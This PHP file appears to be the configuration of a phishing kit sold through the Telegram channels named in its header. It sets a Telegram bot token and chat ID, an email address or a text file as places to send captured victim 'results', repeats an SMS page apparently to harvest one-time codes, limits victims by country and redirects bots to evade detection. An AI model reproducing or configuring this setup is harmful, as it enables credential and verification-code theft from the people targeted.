<?php

    /**//**//**//**//**//**

        Telegram : https://t.me/syst3mx
        Telegram Group : https://t.me/matos_x

    /**//**//**//**//**//**/

    $conf_redirect_bots       = 'https://www.google.com/';

    // Get results via telegram
    $conf_via_telegram        = 1;
    $conf_token               = "7053257890:AAHNnO4cN_cp8OqaawyEIUst5--FxxezQ1w";
    $conf_chat_id             = "1961317020";

    // Get results via email. Active it replacing 0 by 1.
    $conf_via_email           = 0;
    $conf_email               = "mathprosm++++++++gmail.com";

    // Get results via txt file. Active it replacing 0 by 1.
    $conf_via_txt             = 0;
    $conf_txtfilename         = "myResultsFile99";

    // SMS Settings
    $conf_sms_number   = 2; // Number of times the SMS page will be repeated.
    $conf_waiting_time = 20; // Waiting time in seconds.

    // Ex : ['ES','FR','DE']
    $conf_allowed_countries   = ['ES','FR','DE'];

    /////////////////////////////////////////////////

    define("VIA_TELEGRAM", $conf_via_telegram);
    define("TOKEN", $conf_token);
    define("CHAT_ID", $conf_chat_id);
    define("VIA_EMAIL", $conf_via_email);
    define("EMAIL", $conf_email);
    define("VIA_TXT", $conf_via_txt);
    define("TXT_FILENAME", $conf_txtfilename);
    define("SMS_NUMBER", $conf_sms_number);
    define("WAITING_TIME", $conf_waiting_time);
    define("ALLOWED_COUNTRIES", $conf_allowed_countries);
    define("REDIRECT_BOTS", $conf_allowed_countries);

?>
